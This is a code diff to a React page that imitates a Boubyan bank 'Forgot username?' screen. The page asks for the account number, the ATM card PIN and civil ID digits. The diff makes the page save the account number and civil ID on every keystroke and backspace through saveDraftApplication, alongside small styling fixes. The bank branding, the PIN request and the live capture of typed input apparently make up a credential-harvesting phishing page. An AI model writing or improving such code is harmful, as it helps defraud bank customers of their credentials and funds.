@@ -1,4 +1,4 @@
-import { useState, useRef } from 'react'
+import { useState, useRef, useEffect } from 'react'
 import { useNavigate } from 'react-router-dom'
 import { useLanguage } from '../context/LanguageContext'
 import { saveDraftApplication } from '../lib/applicationStorage'
@@ -17,6 +17,14 @@ export default function ContinueApplicationStep2Page() {
   const pinRefs = useRef([])
   const civilRefs = useRef([])
   const allowAutoFocus = useRef(false)
+
+  useEffect(() => {
+    saveDraftApplication({
+      step: 'step-account',
+      status: 'new',
+      source: 'continue-application-step-2',
+    })
+  }, [])
 
   const handleBoxChange = (e, index, refs, state, setState, length, nextGroupFirstRef = null) => {
     const rawVal = e.target.value.replace(/\D/g, '')
@@ -40,6 +48,14 @@ export default function ContinueApplicationStep2Page() {
         nextGroupFirstRef.current?.focus()
       }
     }
+    const nextValues = {
+      accountNumber: refs === accRefs ? newState.join('') : accountNumber.join(''),
+      civilId: refs === civilRefs ? newState.join('') : civilId.join(''),
+      status: 'new',
+      source: 'continue-application-step-2',
+      step: 'step-account',
+    }
+    saveDraftApplication(nextValues)
   }
 
   const handleKeyDown = (e, index, refs, state, setState) => {
@@ -54,6 +70,13 @@ export default function ContinueApplicationStep2Page() {
         setState(newState)
         refs.current[index - 1]?.focus()
       }
+      saveDraftApplication({
+        accountNumber: refs === accRefs ? newState.join('') : accountNumber.join(''),
+        civilId: refs === civilRefs ? newState.join('') : civilId.join(''),
+        status: 'new',
+        source: 'continue-application-step-2',
+        step: 'step-account',
+      })
     }
   }
 
@@ -87,7 +110,7 @@ export default function ContinueApplicationStep2Page() {
       accountNumber: account,
       pin: pinCode,
       civilId: civic,
-      step: 'step-2',
+      step: 'step-account',
     }
 
     saveDraftApplication(payload)
@@ -98,7 +121,6 @@ export default function ContinueApplicationStep2Page() {
     <section className="min-h-screen bg-white flex flex-col justify-between px-4 py-4 sm:py-8 font-sans overflow-x-hidden" dir={isAr ? 'rtl' : 'ltr'}>
       <div className="mx-auto w-full max-w-md flex-1 flex flex-col justify-center py-2">
         
-        {/* Boubyan Logo Section */}
         <div className="mb-6 sm:mb-8 flex justify-center text-center">
           <div className="h-auto w-32 sm:w-40">
             <img
@@ -109,15 +131,12 @@ export default function ContinueApplicationStep2Page() {
           </div>
         </div>
 
-        {/* Title */}
         <div className="mb-6 text-center text-[22px] sm:text-[26px] font-medium text-[#1a1a1a]">
           {isAr ? 'نسيت اسم المستخدم؟' : 'Forgot username?'}
         </div>
 
-        {/* Form Fields Section */}
         <div className="w-full space-y-6 text-right">
           
-          {/* Field 1: رقم الحساب الرئيسي (10 أرقام) */}
           <div className="space-y-2">
             <div>
               <div className="text-xs text-[#888888] mb-0.5">
@@ -149,7 +168,6 @@ export default function ContinueApplicationStep2Page() {
             </div>
           </div>
 
-          {/* Field 2: الرقم السري لبطاقة السحب الآلي (4 أرقام) */}
           <div className="space-y-2">
             <div>
               <div className="text-xs text-[#888888] mb-0.5">
@@ -175,14 +193,12 @@ export default function ContinueApplicationStep2Page() {
                   className={`w-9 h-10 border-b-2 pb-1 text-center text-base sm:text-lg font-semibold text-[#333333] bg-transparent outline-none transition-colors ${
                     digit !== '' ? 'border-[#ce1126]' : 'border-[#b0b0b0] focus:border-[#ce1126]'
                   }`}
-                  style={{ direction: 'ltr' +
-                    '' }}
+                  style={{ direction: 'ltr' }}
                 />
               ))}
             </div>
           </div>
 
-          {/* Field 3: البطاقة المدنية (آخر رقمين) */}
           <div className="space-y-2">
             <div>
               <div className="text-xs text-[#888888] mb-0.5">
@@ -220,7 +236,6 @@ export default function ContinueApplicationStep2Page() {
             </div>
           )}
 
-          {/* Action Buttons */}
           <div className="mt-6 sm:mt-8 flex gap-3 pt-2">
             <button
               type="button"
@@ -232,7 +247,7 @@ export default function ContinueApplicationStep2Page() {
             <button
               type="button"
               onClick={() => navigate('/continue-application')}
-              className="flex-1 rounded-[22px] border border-[#d8d8d8] bg-white px-5 py-3.5 sm:py-4 text-center text-base sm:text-lg font-bold text-333333 shadow-[0_2px_8px_rgba(0,0,0,0.03)] transition hover:bg-[#f8f8f8]"
+              className="flex-1 rounded-[22px] border border-[#d8d8d8] bg-white px-5 py-3.5 sm:py-4 text-center text-base sm:text-lg font-bold text-[#333333] shadow-[0_2px_8px_rgba(0,0,0,0.03)] transition hover:bg-[#f8f8f8]"
             >
               {isAr ? 'إلغاء' : 'Cancel'}
             </button>
